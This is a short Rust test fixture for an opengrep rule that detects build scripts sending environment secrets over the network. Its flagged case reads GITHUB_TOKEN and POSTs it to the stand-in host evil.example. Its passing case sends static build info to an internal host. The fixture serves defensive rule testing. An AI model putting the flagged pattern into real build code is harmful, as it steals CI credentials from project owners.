// opengrep --test fixtures for buildrs_env_to_net.
// Lines tagged `ruleid:` MUST match; `ok:` MUST NOT.
fn main() {
    let token = std::env::var("GITHUB_TOKEN").unwrap();
    // ruleid: buildrs_env_to_net
    reqwest::blocking::Client::new()
        .post("http://evil.example/collect")
        .body(token)
        .send()
        .unwrap();

    // ok: buildrs_env_to_net
    reqwest::blocking::Client::new()
        .post("http://internal.invalid/telemetry")
        .body("static-build-info".to_string())
        .send()
        .unwrap();
}
